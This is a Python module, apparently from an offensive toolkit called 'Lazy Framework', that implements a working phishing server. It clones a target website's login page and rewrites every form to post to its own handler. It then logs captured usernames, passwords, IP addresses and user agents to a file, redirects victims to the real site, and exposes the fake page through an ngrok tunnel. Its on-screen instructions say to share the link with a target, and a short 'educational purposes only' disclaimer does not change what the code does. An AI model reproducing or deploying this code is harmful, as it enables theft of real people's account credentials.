#!/usr/bin/env python3

MODULE_INFO = {
    "name": "Phishing Server",
    "description": "Advanced phishing server dengan cloning URL asli dan tunneling Ngrok",
    "author": "Lazy Framework",
    "license": "MIT",
    "dependencies": ["flask", "pyngrok", "requests", "beautifulsoup4"],
    "platform": "Multi",
    "rank": "Normal",
}

OPTIONS = {
    "target_url": {
        "description": "Target URL to clone (e.g., https://example.com)",
        "required": True,
        "default": "https://example.com"
    },
    "port": {
        "description": "Local server port",
        "required": False,
        "default": "8080"
    },
    "use_ngrok": {
        "description": "Use Ngrok tunneling (true/false)",
        "required": False,
        "default": "false"
    },
    "ngrok_region": {
        "description": "Ngrok region (us, eu, ap, au, sa, jp, in)",
        "required": False,
        "default": "us"
    },
    "output_file": {
        "description": "Output file for captured credentials",
        "required": False,
        "default": "captured_credentials.txt"
    },
    "auto_open": {
        "description": "Auto-open browser (true/false)",
        "required": False,
        "default": "false"
    }
}

class PhishingServer:
    """Advanced phishing server dengan real URL cloning dan rich UI"""
    
    def __init__(self, console, target_url, port=8080, use_ngrok=False, ngrok_region="us", output_file="captured_credentials.txt", auto_open=False):
        self.console = console
        self.target_url = target_url
        self.port = port
        self.use_ngrok = use_ngrok
        self.ngrok_region = ngrok_region
        self.output_file = output_file
        self.auto_open = auto_open
        
        self.server_url = None
        self.ngrok_url = None
        self.captured_credentials = []
        self.stats = {
            'total_attempts': 0,
            'successful_captures': 0,
            'start_time': None,
            'server_status': 'stopped'
        }
        
        self.cloned_html = ""
        self.form_elements = []
        self.flask_app = None
        self.server_thread = None
        self._stop_server = False

    def check_port_availability(self):
        """Cek apakah port sedang digunakan"""
        import socket
        from rich.table import Table
        
        try:
            # Coba buat socket ke port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('localhost', self.port))
            sock.close()
            
            if result == 0:
                # Port sedang digunakan
                table = Table(show_header=True, header_style="bold yellow", border_style="yellow")
                table.add_column("Status", style="red")
                table.add_column("Port", style="cyan")
                table.add_column("Action", style="yellow")
                
                table.add_row("⚠️ PORT BUSY", f"{self.port}", "Attempting to kill...")
                self.console.print(table)
                return False
            else:
                # Port tersedia
                table = Table(show_header=True, header_style="bold green", border_style="green")
                table.add_column("Status", style="green")
                table.add_column("Port", style="cyan")
                table.add_column("Info", style="white")
                
                table.add_row("✅ PORT AVAILABLE", f"{self.port}", "Ready to use")
                self.console.print(table)
                return True
                
        except Exception as e:
            self.console.print(f"[red]❌ Error checking port: {e}[/red]")
            return False

    def kill_process_on_port(self):
        """Kill process yang menggunakan port tertentu"""
        import subprocess
        import os
        from rich.table import Table
        
        try:
            self.console.print(f"[yellow]🔍 Searching for processes using port {self.port}...[/yellow]")
            
            processes_killed = []
            
            # Method 1: Gunakan fuser (Linux/Termux)
            try:
                result = subprocess.run(['fuser', '-k', f'{self.port}/tcp'], 
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    processes_killed.append("fuser")
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
            
            # Method 2: Gunakan lsof
            try:
                lsof_result = subprocess.run(['lsof', '-ti', f':{self.port}'], 
                                           capture_output=True, text=True, timeout=10)
                if lsof_result.returncode == 0:
                    pids = lsof_result.stdout.strip().split('\n')
                    for pid in pids:
                        if pid:
                            subprocess.run(['kill', '-9', pid], timeout=10)
                            processes_killed.append(f"PID {pid}")
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
            
            # Method 3: Gunakan netstat
            try:
                netstat_result = subprocess.run(['netstat', '-tulpn'], 
                                              capture_output=True, text=True, timeout=10)
                if netstat_result.returncode == 0:
                    lines = netstat_result.stdout.split('\n')
                    for line in lines:
                        if f':{self.port} ' in line and 'LISTEN' in line:
                            parts = line.split()
                            if len(parts) > 6:
                                pid_info = parts[6]
                                if '/' in pid_info:
                                    pid = pid_info.split('/')[0]
                                    subprocess.run(['kill', '-9', pid], timeout=10)
                                    processes_killed.append(f"PID {pid}")
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
            
            # Method 4: Gunakan ss
            try:
                ss_result = subprocess.run(['ss', '-lptn', f'sport = :{self.port}'], 
                                         capture_output=True, text=True, timeout=10)
                if ss_result.returncode == 0 and 'LISTEN' in ss_result.stdout:
                    lines = ss_result.stdout.split('\n')
                    for line in lines:
                        if 'pid=' in line:
                            import re
                            pid_match = re.search(r'pid=(\d+)', line)
                            if pid_match:
                                pid = pid_match.group(1)
                                subprocess.run(['kill', '-9', pid], timeout=10)
                                processes_killed.append(f"PID {pid}")
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
            
            # Tampilkan hasil
            if processes_killed:
                table = Table(show_header=True, header_style="bold green", border_style="green")
                table.add_column("Action", style="cyan")
                table.add_column("Port", style="yellow")
                table.add_column("Processes Killed", style="red")
                
                table.add_row("✅ PORT FREED", f"{self.port}", ", ".join(processes_killed))
                self.console.print(table)
                return True
            else:
                table = Table(show_header=True, header_style="bold yellow", border_style="yellow")
                table.add_column("Status", style="yellow")
                table.add_column("Port", style="cyan")
                table.add_column("Info", style="white")
                
                table.add_row("⚠️ NO PROCESS FOUND", f"{self.port}", "Port might be free")
                self.console.print(table)
                return True
                
        except Exception as e:
            self.console.print(f"[red]❌ Error killing process on port: {e}[/red]")
            return False

    def force_port_cleanup(self):
        """Force cleanup port dengan multiple methods"""
        from rich.panel import Panel
        from rich.text import Text
        
        # Tampilkan header cleanup
        cleanup_text = Text()
        cleanup_text.append("🛠️ PORT CLEANUP UTILITY\n", style="bold yellow")
        cleanup_text.append(f"Checking and freeing port {self.port} for phishing server...")
        
        self.console.print(Panel(cleanup_text, style="yellow"))
        
        # Step 1: Cek port availability
        if not self.check_port_availability():
            # Step 2: Jika port busy, kill processes
            self.console.print(f"[yellow]🔄 Attempting to kill processes on port {self.port}...[/yellow]")
            if self.kill_process_on_port():
                # Step 3: Tunggu sebentar dan cek lagi
                import time
                time.sleep(2)
                
                # Final check
                if self.check_port_availability():
                    self.console.print(f"[green]✅ Port {self.port} is now available![/green]")
                    return True
                else:
                    self.console.print(f"[red]❌ Failed to free port {self.port}. Try a different port.[/red]")
                    return False
            else:
                self.console.print(f"[red]❌ Could not kill processes on port {self.port}. Try manual kill or different port.[/red]")
                return False
        else:
            return True
    
    def show_banner(self):
        """Tampilkan banner keren dengan Rich"""
        from rich.panel import Panel
        from rich.align import Align
        from rich.text import Text
        
        banner_text = Text()
        banner_text.append("🎣 ", style="bold red")
        banner_text.append("ADVANCED PHISHING SERVER", style="bold cyan")
        banner_text.append(" 🎣", style="bold red")
        
        subtitle = Text()
        subtitle.append("Real-time Website Cloning & Credential Capture", style="yellow")
        
        panel = Panel(
            Align.center(banner_text + "\n" + subtitle),
            style="bold magenta",
            padding=(1, 2)
        )
        self.console.print(panel)
    
    def show_config_table(self):
        """Tampilkan tabel konfigurasi yang keren"""
        from rich.table import Table
        
        table = Table(show_header=True, header_style="bold magenta", border_style="blue")
        table.add_column("Configuration", style="cyan", width=20)
        table.add_column("Value", style="white")
        
        table.add_row("🎯 Target URL", self.target_url)
        table.add_row("🔌 Port", str(self.port))
        table.add_row("🌐 Ngrok", "✅ Enabled" if self.use_ngrok else "❌ Disabled")
        table.add_row("🗺️ Ngrok Region", self.ngrok_region)
        table.add_row("💾 Output File", self.output_file)
        table.add_row("🌐 Auto Browser", "✅ Yes" if self.auto_open else "❌ No")
        
        self.console.print(table)
    
    def show_capture_alert(self, credential_data):
        """Tampilkan alert ketika credential dicapture"""
        from rich.panel import Panel
        from rich.table import Table
        
        # Buat table untuk credential yang dicapture
        cred_table = Table(show_header=True, header_style="bold red", border_style="red")
        cred_table.add_column("Field", style="cyan")
        cred_table.add_column("Value", style="yellow")
        
        # Tambahkan data credential yang penting
        for key, value in credential_data['form_data'].items():
            if any(field in key.lower() for field in ['user', 'pass', 'email', 'login', 'auth']):
                cred_table.add_row(key, str(value))
        
        # Panel alert
        alert_panel = Panel(
            cred_table,
            title=f"🚨 CREDENTIAL CAPTURED - {credential_data['timestamp']}",
            subtitle=f"From: {credential_data['client_ip']}",
            style="bold red",
            padding=(1, 2)
        )
        
        self.console.print(alert_panel)
    
    def show_server_status(self):
        """Tampilkan status server"""
        from rich.table import Table
        import time
        
        if not self.stats['start_time']:
            return None
        
        uptime = time.time() - self.stats['start_time']
        
        # Buat status table
        status_table = Table(show_header=False, box=None, padding=(0, 2))
        status_table.add_column("Metric", style="cyan")
        status_table.add_column("Value", style="white")
        
        status_table.add_row("🔄 Server Status", f"[green]{self.stats['server_status'].upper()}[/green]")
        status_table.add_row("📊 Total Attempts", f"[yellow]{self.stats['total_attempts']}[/yellow]")
        status_table.add_row("🎯 Successful Captures", f"[red]{self.stats['successful_captures']}[/red]")
        status_table.add_row("⏱️ Uptime", f"[blue]{uptime:.1f} seconds[/blue]")
        
        if self.server_url:
            status_table.add_row("🔗 Local URL", f"[cyan]{self.server_url}[/cyan]")
        if self.ngrok_url:
            status_table.add_row("🌐 Ngrok URL", f"[green]{self.ngrok_url}[/green]")
        
        return status_table
    
    def show_recent_captures_table(self):
        """Tampilkan tabel capture terbaru"""
        from rich.table import Table
        
        if not self.captured_credentials:
            return None
        
        table = Table(title="🎯 Recent Captured Credentials", show_header=True, header_style="bold red")
        table.add_column("Time", style="cyan", width=12)
        table.add_column("IP Address", style="yellow", width=15)
        table.add_column("Credentials", style="white")
        
        # Tampilkan 5 capture terbaru
        for cred in self.captured_credentials[-5:]:
            time_str = cred['timestamp'].split()[1]  # Ambil jam saja
            cred_text = ""
            
            for key, value in cred['form_data'].items():
                if any(field in key.lower() for field in ['user', 'pass', 'email', 'login']):
                    cred_text += f"{key}: {value}\n"
            
            table.add_row(time_str, cred['client_ip'], cred_text.strip())
        
        return table
    
    def show_live_dashboard(self):
        """Tampilkan dashboard live dengan semua informasi"""
        from rich.layout import Layout
        from rich.panel import Panel
        
        layout = Layout()
        
        # Split utama
        layout.split_row(
            Layout(name="left"),
            Layout(name="right")
        )
        
        # Split kiri untuk status
        layout["left"].split(
            Layout(Panel(self.show_server_status(), title="📊 Server Status", border_style="green"), name="status"),
            Layout(Panel(self.show_recent_captures_table() or "No captures yet", title="🎯 Recent Captures", border_style="red"), name="captures")
        )
        
        # Split kanan untuk form info
        form_info = self.show_form_analysis_table()
        layout["right"].split(
            Layout(Panel(form_info, title="🔍 Form Analysis", border_style="blue"), name="forms"),
            Layout(Panel(self.show_instructions(), title="ℹ️ Instructions", border_style="yellow"), name="instructions")
        )
        
        return layout
    
    def show_form_analysis_table(self):
        """Tampilkan analisis form yang ditemukan"""
        from rich.table import Table
        
        if not self.form_elements:
            return "No forms analyzed"
        
        table = Table(show_header=True, header_style="bold blue")
        table.add_column("Form", style="cyan", width=8)
        table.add_column("Method", style="yellow", width=8)
        table.add_column("Input Fields", style="white")
        table.add_column("Types", style="green")
        
        for i, form in enumerate(self.form_elements[:3]):  # Tampilkan max 3 form
            input_names = []
            input_types = []
            
            for inp in form['inputs'][:5]:  # Tampilkan max 5 input per form
                if inp['name']:
                    input_names.append(inp['name'])
                    input_types.append(inp['type'])
            
            table.add_row(
                f"#{i+1}",
                form['method'].upper(),
                "\n".join(input_names) if input_names else "No names",
                "\n".join(input_types) if input_types else "No types"
            )
        
        return table
    
    def show_instructions(self):
        """Tampilkan instruksi penggunaan"""
        from rich.text import Text
        
        instructions = Text()
        instructions.append("🎯 How to Use:\n", style="bold green")
        instructions.append("1. Share the phishing URL with target\n")
        instructions.append("2. Monitor this dashboard for captures\n")
        instructions.append("3. Credentials saved automatically\n")
        instructions.append("4. Press Ctrl+C to stop server\n\n")
        instructions.append("⚠️ Legal Notice:\n", style="bold red")
        instructions.append("For educational purposes only!\n")
        instructions.append("Get proper authorization before use.", style="red")
        
        return instructions
    
    def clean_html_for_jinja(self, html_content):
        """Bersihkan HTML content untuk Jinja2 templates"""
        import re
        
        cleaned_html = re.sub(r'\{', '{{ "{" }}', html_content)
        cleaned_html = re.sub(r'\}', '{{ "}" }}', cleaned_html)
        
        if '<html' not in cleaned_html.lower():
            cleaned_html = f'<!DOCTYPE html><html><head><title>Login</title></head><body>{cleaned_html}</body></html>'
        
        return cleaned_html
    
    def create_simple_login_form(self):
        """Buat form login sederhana sebagai fallback"""
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .login-form {{ max-width: 300px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }}
        input[type="text"], input[type="password"] {{ width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 3px; }}
        input[type="submit"] {{ width: 100%; padding: 10px; background: #007cba; color: white; border: none; border-radius: 3px; cursor: pointer; }}
    </style>
</head>
<body>
    <div class="login-form">
        <h2>Login to Your Account</h2>
        <form action="/submit" method="post">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="hidden" name="original_url" value="{target_url}">
            <input type="submit" value="Login">
        </form>
    </div>
</body>
</html>'''.format(target_url=self.target_url)
    
    def clone_website(self):
        """Clone website target dan extract form elements"""
        try:
            import requests
            from bs4 import BeautifulSoup
            import urllib3
            
            self.console.print("[yellow]🔄 Cloning website...[/yellow]")
            
            # Disable SSL warnings
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
            }
            
            session = requests.Session()
            session.headers.update(headers)
            
            response = session.get(self.target_url, timeout=15, verify=False)
            
            if response.history:
                self.console.print(f"[cyan]↪️ Redirected to: {response.url}[/cyan]")
            
            response.raise_for_status()
            
            # Parse HTML
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Find all forms
            forms = soup.find_all('form')
            self.form_elements = []
            
            for i, form in enumerate(forms):
                form_info = {
                    'index': i,
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                # Find all input fields
                inputs = form.find_all(['input', 'textarea', 'select'])
                for inp in inputs:
                    input_info = {
                        'type': inp.get('type', 'text'),
                        'name': inp.get('name', ''),
                        'placeholder': inp.get('placeholder', ''),
                        'id': inp.get('id', ''),
                        'value': inp.get('value', '')
                    }
                    form_info['inputs'].append(input_info)
                
                self.form_elements.append(form_info)
            
            # Modify forms to submit to our server
            for form in forms:
                original_action = form.get('action', '')
                form['action'] = '/submit'
                form['method'] = 'post'
                
                # Add hidden fields
                hidden_url = soup.new_tag('input')
                hidden_url['type'] = 'hidden'
                hidden_url['name'] = 'original_url'
                hidden_url['value'] = self.target_url
                form.append(hidden_url)
                
                hidden_action = soup.new_tag('input')
                hidden_action['type'] = 'hidden'
                hidden_action['name'] = 'original_action'
                hidden_action['value'] = original_action
                form.append(hidden_action)
            
            # Get cleaned HTML
            raw_html = str(soup)
            self.cloned_html = self.clean_html_for_jinja(raw_html)
            
            self.console.print("[green]✅ Successfully cloned website[/green]")
            
            # Tampilkan form analysis
            from rich.panel import Panel
            form_table = self.show_form_analysis_table()
            self.console.print(Panel(form_table, title="🔍 Form Analysis Results", border_style="blue"))
            
            return True
            
        except Exception as e:
            self.console.print(f"[red]❌ Error cloning website: {e}[/red]")
            self.console.print("[yellow]🔄 Using simple login form as fallback[/yellow]")
            
            # Use simple form as fallback
            self.cloned_html = self.create_simple_login_form()
            self.form_elements = [{
                'index': 0,
                'action': '/submit',
                'method': 'post',
                'inputs': [
                    {'type': 'text', 'name': 'username', 'placeholder': 'Username or Email'},
                    {'type': 'password', 'name': 'password', 'placeholder': 'Password'}
                ]
            }]
            
            return True
    
    def setup_ngrok(self):
        """Setup Ngrok tunneling"""
        try:
            from pyngrok import ngrok
            
            self.console.print(f"[yellow]🔄 Starting Ngrok tunnel on port {self.port}[/yellow]")
            
            # Create tunnel
            tunnel = ngrok.connect(self.port, region=self.ngrok_region, bind_tls=True)
            self.ngrok_url = tunnel.public_url
            
            self.console.print(f"[green]✅ Ngrok URL: {self.ngrok_url}[/green]")
            return True
            
        except Exception as e:
            self.console.print(f"[red]❌ Ngrok error: {e}[/red]")
            return False
    
    def create_flask_app(self):
        """Create Flask application"""
        from flask import Flask, request, render_template_string, redirect
        import datetime
        import html
        
        app = Flask(__name__)
        
        @app.route('/')
        def index():
            """Serve the cloned website"""
            try:
                return render_template_string(self.cloned_html)
            except Exception as e:
                self.console.print(f"[red]❌ Template error: {e}[/red]")
                simple_form = self.create_simple_login_form()
                return render_template_string(simple_form)
        
        @app.route('/submit', methods=['POST'])
        def submit():
            """Handle form submissions"""
            try:
                self.stats['total_attempts'] += 1
                
                # Capture form data
                form_data = {}
                for key, values in request.form.lists():
                    if len(values) == 1:
                        form_data[key] = values[0]
                    else:
                        form_data[key] = values
                
                original_url = form_data.pop('original_url', self.target_url)
                original_action = form_data.pop('original_action', '')
                
                # Log the attempt
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                client_ip = request.remote_addr
                user_agent = request.headers.get('User-Agent', 'Unknown')
                
                credential_data = {
                    'timestamp': timestamp,
                    'client_ip': client_ip,
                    'user_agent': user_agent,
                    'original_url': original_url,
                    'original_action': original_action,
                    'form_data': form_data
                }
                
                self.captured_credentials.append(credential_data)
                self.stats['successful_captures'] += 1
                
                # Save to file
                self._save_credentials(credential_data)
                
                # Tampilkan alert dengan rich table
                self.show_capture_alert(credential_data)
                
                # Redirect to original website
                try:
                    if original_url.startswith(('http://', 'https://')):
                        return redirect(original_url)
                    else:
                        return redirect(f"https://{original_url}")
                except:
                    success_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Login Successful</title>
    <meta http-equiv="refresh" content="3;url={}">
</head>
<body>
    <h2>Login Successful</h2>
    <p>You have been logged in successfully. Redirecting...</p>
</body>
</html>'''.format(html.escape(original_url))
                    return success_html
                
            except Exception as e:
                self.console.print(f"[red]❌ Error processing form: {e}[/red]")
                return "Error processing form", 500
        
        @app.route('/stats')
        def stats():
            """Show server statistics"""
            import time
            current_time = time.time()
            uptime = current_time - self.stats['start_time'] if self.stats['start_time'] else 0
            
            stats_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Server Statistics</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .stats {{ background: #f5f5f5; padding: 20px; border-radius: 5px; }}
    </style>
</head>
<body>
    <h2>Server Statistics</h2>
    <div class="stats">
        <p><strong>Total Attempts:</strong> {}</p>
        <p><strong>Successful Captures:</strong> {}</p>
        <p><strong>Uptime:</strong> {:.1f} seconds</p>
    </div>
    <p><a href="/">Back to Site</a></p>
</body>
</html>'''.format(self.stats['total_attempts'], self.stats['successful_captures'], uptime)
            return stats_html
        
        @app.errorhandler(404)
        def not_found(e):
            return redirect('/')
        
        return app
    
    def run_flask_server(self):
        """Run Flask server dengan fix untuk environment variables"""
        try:
            import os
            
            # Clear problematic environment variables
            env_vars_to_remove = [
                'WERKZEUG_RUN_MAIN',
                'WERKZEUG_SERVER_FD',
                'WERKZEUG_DEBUG_PIN',
                'FLASK_DEBUG'
            ]
            
            for var in env_vars_to_remove:
                if var in os.environ:
                    del os.environ[var]
            
            os.environ['FLASK_ENV'] = 'production'
            
            self.flask_app = self.create_flask_app()
            
            self.console.print(f"[green]🔄 Starting Flask server on port {self.port}...[/green]")
            
            self.flask_app.run(
                host='0.0.0.0', 
                port=self.port, 
                debug=False,
                use_reloader=False,
                threaded=True
            )
            
        except Exception as e:
            self.console.print(f"[red]❌ Flask server error: {e}[/red]")
    
    def start_server(self):
        """Start phishing server dengan port cleanup"""
        import threading
        import time
        import webbrowser
        
        try:
            # Step 1: Cleanup port sebelum start
            if not self.force_port_cleanup():
                self.console.print(f"[red]❌ Cannot start server. Port {self.port} is not available.[/red]")
                return False
            
            # Step 2: Start server thread
            self.server_thread = threading.Thread(target=self.run_flask_server, daemon=True)
            self.server_thread.start()
            
            time.sleep(3)
            
            self.stats['start_time'] = time.time()
            self.stats['server_status'] = 'running'
            
            self.server_url = f"http://localhost:{self.port}"
            self.console.print(f"[green]✅ Server started: {self.server_url}[/green]")
            
            # Test server
            try:
                import requests
                response = requests.get(self.server_url, timeout=5)
                if response.status_code == 200:
                    self.console.print(f"[green]✅ Server is accessible and responding[/green]")
            except:
                self.console.print(f"[yellow]⚠️ Could not verify server accessibility[/yellow]")
            
            # Setup Ngrok
            if self.use_ngrok:
                if self.setup_ngrok():
                    self.console.print(f"[green]✅ Ngrok tunnel established[/green]")
            
            # Auto-open browser
            if self.auto_open:
                try:
                    url_to_open = self.ngrok_url if self.ngrok_url else self.server_url
                    webbrowser.open(url_to_open)
                    self.console.print(f"[cyan]✅ Browser opened automatically[/cyan]")
                except:
                    self.console.print(f"[yellow]⚠️ Could not open browser automatically[/yellow]")
            
            return True
            
        except Exception as e:
            self.console.print(f"[red]❌ Error starting server: {e}[/red]")
            return False
    
    def _save_credentials(self, credential_data):
        """Save captured credentials to file"""
        try:
            import json
            import os
            
            os.makedirs(os.path.dirname(os.path.abspath(self.output_file)) if os.path.dirname(self.output_file) else '.', exist_ok=True)
            
            with open(self.output_file, 'a', encoding='utf-8') as f:
                f.write("=" * 60 + "\n")
                f.write(f"Timestamp: {credential_data['timestamp']}\n")
                f.write(f"Client IP: {credential_data['client_ip']}\n")
                f.write(f"User Agent: {credential_data['user_agent']}\n")
                f.write(f"Original URL: {credential_data['original_url']}\n")
                f.write("Form Data:\n")
                
                for key, value in credential_data['form_data'].items():
                    f.write(f"  {key}: {value}\n")
                
                f.write("\n")
            
            self.console.print(f"[dim]💾 Credentials saved to {self.output_file}[/dim]")
                
        except Exception as e:
            self.console.print(f"[red]❌ Error saving credentials: {e}[/red]")
    
    def stop_server(self):
        """Stop phishing server"""
        self.stats['server_status'] = 'stopped'
        self._stop_server = True
        
        if self.ngrok_url:
            try:
                from pyngrok import ngrok
                ngrok.disconnect(self.ngrok_url)
                self.console.print("[green]✅ Ngrok tunnel closed[/green]")
            except:
                self.console.print("[yellow]⚠️ Error closing Ngrok tunnel[/yellow]")
    
    def run_phishing(self):
        """Run complete phishing attack dengan rich interface"""
        import time
        from rich.panel import Panel
        
        # Tampilkan banner dan config
        self.show_banner()
        self.show_config_table()
        
        # Clone website
        if not self.clone_website():
            return False
        
        # Start server
        if not self.start_server():
            return False
        
        # Tampilkan dashboard awal
        self.console.print("\n")
        self.console.print(self.show_live_dashboard())
        
        self.console.print("\n[bold yellow]📡 Server is running... Press Ctrl+C to stop[/bold yellow]")
        self.console.print("[cyan]👀 Monitoring for credentials...[/cyan]")
        
        try:
            # Update stats periodically
            last_stats_time = 0
            while self.stats['server_status'] == 'running':
                time.sleep(2)
                
                # Update every 10 seconds
                current_time = time.time()
                if current_time - last_stats_time >= 10:
                    self.console.clear()
                    self.show_banner()
                    self.console.print(self.show_live_dashboard())
                    last_stats_time = current_time
                    
                if not self.server_thread.is_alive():
                    self.console.print("[red]❌ Server thread stopped unexpectedly[/red]")
                    break
                    
        except KeyboardInterrupt:
            self.console.print("\n[yellow]🛑 Stopping phishing server...[/yellow]")
        
        finally:
            self.stop_server()
            
            # Tampilkan final stats
            final_stats = self.show_server_status()
            final_captures = self.show_recent_captures_table()
            
            if final_stats:
                self.console.print(Panel(final_stats, title="📊 Final Statistics", border_style="green"))
            if final_captures:
                self.console.print(Panel(final_captures, title="🎯 Captured Credentials", border_style="red"))
            
            return True

def run(session, options):
    from rich.console import Console
    
    console = Console()
    
    # Parse options
    target_url = options.get("target_url", "https://example.com")
    port = int(options.get("port", 8080))
    use_ngrok = options.get("use_ngrok", "false").lower() == "true"
    ngrok_region = options.get("ngrok_region", "us")
    output_file = options.get("output_file", "captured_credentials.txt")
    auto_open = options.get("auto_open", "false").lower() == "true"
    
    # Validate URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    # Create phishing server
    server = PhishingServer(
        console=console,
        target_url=target_url,
        port=port,
        use_ngrok=use_ngrok,
        ngrok_region=ngrok_region,
        output_file=output_file,
        auto_open=auto_open
    )
    
    try:
        success = server.run_phishing()
        if success:
            console.print("[green]✅ Phishing server completed successfully[/green]")
        else:
            console.print("[red]❌ Phishing server failed to start[/red]")
            
    except Exception as e:
        console.print(f"[red]❌ Phishing server error: {e}[/red]")
        import traceback
        console.print(f"[dim]{traceback.format_exc()}[/dim]")
    finally:
        console.print("[yellow]👋 Phishing session ended.[/yellow]")

if __name__ == "__main__":
    from rich.console import Console
    console = Console()
    
    test_options = {
        "target_url": "https://example.com",
        "port": "8080",
        "use_ngrok": "false",
        "ngrok_region": "us",
        "output_file": "test_credentials.txt",
        "auto_open": "false"
    }
    
    class TestSession:
        pass
    
    run(TestSession(), test_options)
